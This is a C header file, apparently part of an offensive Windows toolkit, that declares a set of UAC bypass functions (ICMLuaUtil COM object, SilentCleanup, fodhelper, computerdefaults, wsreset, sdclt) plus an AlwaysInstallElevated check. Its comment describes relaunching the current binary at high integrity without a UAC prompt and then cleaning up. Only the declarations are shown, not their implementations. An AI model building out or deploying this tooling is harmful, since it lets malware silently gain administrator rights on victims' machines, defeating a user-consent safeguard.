#pragma once
#include <windows.h>
#include <stdbool.h>

/*
 * UAC bypass techniques — user mode → high integrity without UAC prompt.
 * Each technique relaunches the current binary elevated via an auto-elevate
 * COM object or process, waits for it to complete, then cleans up.
 *
 * Call jocky_uac_bypass() to try all methods in sequence.
 * Returns true if an elevated child was launched successfully (caller should exit).
 * Returns false if all methods failed (caller continues as standard user).
 *
 * Check jocky_check_always_install_elevated() separately — exploitation of
 * that policy requires a staged MSI, so it is detection-only here.
 */

bool jocky_uac_bypass_icmluautil(const char* self_path);
bool jocky_uac_bypass_silentcleanup(const char* self_path);
bool jocky_uac_bypass_fodhelper(const char* self_path);
bool jocky_uac_bypass_computerdefaults(const char* self_path);
bool jocky_uac_bypass_wsreset(const char* self_path);
bool jocky_uac_bypass_sdclt(const char* self_path);
bool jocky_check_always_install_elevated(void);
bool jocky_uac_bypass(void);
